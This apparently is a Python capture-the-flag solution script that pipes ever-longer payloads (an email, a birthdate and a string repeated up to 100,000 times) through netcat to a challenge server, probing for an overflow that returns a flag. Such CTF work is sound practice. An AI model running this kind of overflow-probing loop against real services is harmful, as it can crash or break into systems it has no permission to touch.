import subprocess
from subprocess import TimeoutExpired

import numpy as np

from warmup.constants import (
    BIRTHDATE,
    CAMEL,
    PORT,
    SERVER,
    WRONG_CAMEL_ERROR,
)


def overflow_camel(valid_email: str) -> str | None:
    lengths = list(range(5_000, 105_000, 5_000))
    total_attempts = len(lengths)
    digits = int(np.log10(total_attempts)) + 1

    for attempt, length in enumerate(lengths, 1):
        payload = f"{valid_email} {BIRTHDATE} {CAMEL * length}\n"

        print(f"[{attempt:0{digits}d}/{total_attempts}] {length:,}")

        try:
            result = subprocess.run(
                ["nc", SERVER, str(PORT)],
                capture_output=True,
                check=True,
                input=payload,
                text=True,
                timeout=5,
            )
        except TimeoutExpired:
            print("[TIMEOUT]")
            continue

        if (
            (stdout := result.stdout) is not None
            and (stdout := stdout.strip())
            and WRONG_CAMEL_ERROR not in stdout
        ):
            print(stdout)
            flag = stdout.split()[-1]
            return flag

    return None
